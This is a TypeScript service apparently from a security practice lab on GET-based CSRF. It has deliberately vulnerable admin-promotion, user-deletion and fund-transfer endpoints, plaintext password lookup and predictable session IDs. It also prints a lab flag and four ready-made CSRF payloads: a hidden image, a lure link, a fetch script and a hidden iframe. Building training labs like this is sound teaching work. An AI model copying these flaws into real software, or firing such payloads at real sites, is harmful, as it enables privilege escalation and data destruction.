import {
  Injectable,
  UnauthorizedException,
  ForbiddenException,
} from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class Lab3Service {
  private sessions = new Map<string, string>();

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.sessions.clear();
    return this.stateService.initializeState(userId, labId);
  }

  async login(
    userId: string,
    labId: string,
    username: string,
    password: string,
  ) {
    const user = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username, password },
    });

    if (!user) {
      throw new UnauthorizedException('Invalid credentials');
    }

    const sessionId = `sess_${Date.now()}`;
    this.sessions.set(sessionId, username);

    return { success: true, sessionId, user };
  }

  // ❌ الثغرة: GET request لـ state-changing operation!
  async promoteToAdmin(
    userId: string,
    labId: string,
    sessionId: string,
    targetUsername: string,
  ) {
    const adminUsername = this.sessions.get(sessionId);
    if (!adminUsername) {
      throw new UnauthorizedException('Invalid session');
    }

    const admin = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username: adminUsername },
    });

    if (!admin || admin.role !== 'ADMIN') {
      throw new ForbiddenException('Admin access required');
    }

    const target = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username: targetUsername },
    });

    if (!target) {
      throw new ForbiddenException('Target user not found');
    }

    // ترقية المستخدم لـ ADMIN
    await this.prisma.labGenericUser.update({
      where: { id: target.id },
      data: { role: 'ADMIN' },
    });

    // التحقق من الاستغلال
    if (targetUsername === 'victim') {
      return {
        success: true,
        message: `${targetUsername} promoted to ADMIN`,
        exploited: true,
        flag: 'FLAG{GET_BASED_CSRF_EXPLOITED}',
        warning: 'GET-based CSRF! State-changing operation via GET request',
      };
    }

    return { success: true, message: `${targetUsername} promoted to ADMIN` };
  }

  // ❌ الثغرة: DELETE operation via GET
  async deleteUser(
    userId: string,
    labId: string,
    sessionId: string,
    targetUsername: string,
  ) {
    const adminUsername = this.sessions.get(sessionId);
    if (!adminUsername) {
      throw new UnauthorizedException('Invalid session');
    }

    const admin = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username: adminUsername },
    });

    if (!admin || admin.role !== 'ADMIN') {
      throw new ForbiddenException('Admin access required');
    }

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'USER_DELETED',
        meta: { target: targetUsername, deletedBy: adminUsername },
      },
    });

    return { success: true, message: `${targetUsername} deleted` };
  }

  // ❌ الثغرة: Transfer funds via GET with URL parameters
  async transferViaGet(
    userId: string,
    labId: string,
    sessionId: string,
    amount: number,
  ) {
    const username = this.sessions.get(sessionId);
    if (!username) {
      throw new UnauthorizedException('Invalid session');
    }

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'GET_TRANSFER',
        meta: { amount, user: username },
      },
    });

    return {
      success: true,
      message: `Transferred ${amount}$ via GET request`,
      warning: 'Dangerous! Transfer executed via GET',
    };
  }

  // Generate attack URLs
  async generateAttackUrls(userId: string, labId: string, baseUrl: string) {
    return {
      attacks: [
        {
          type: 'Image tag CSRF',
          html: `<img src="${baseUrl}/promote?sessionId=ADMIN_SESSION&targetUsername=victim" style="display:none;" />`,
        },
        {
          type: 'Link click CSRF',
          html: `<a href="${baseUrl}/promote?sessionId=ADMIN_SESSION&targetUsername=victim">Click for free prize!</a>`,
        },
        {
          type: 'Script-based CSRF',
          html: `<script>fetch('${baseUrl}/promote?sessionId=ADMIN_SESSION&targetUsername=victim');</script>`,
        },
        {
          type: 'iframe CSRF',
          html: `<iframe src="${baseUrl}/delete-user?sessionId=ADMIN_SESSION&targetUsername=victim" style="display:none;"></iframe>`,
        },
      ],
    };
  }

  async getUser(userId: string, labId: string, username: string) {
    const user = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username },
    });
    return { user };
  }
}
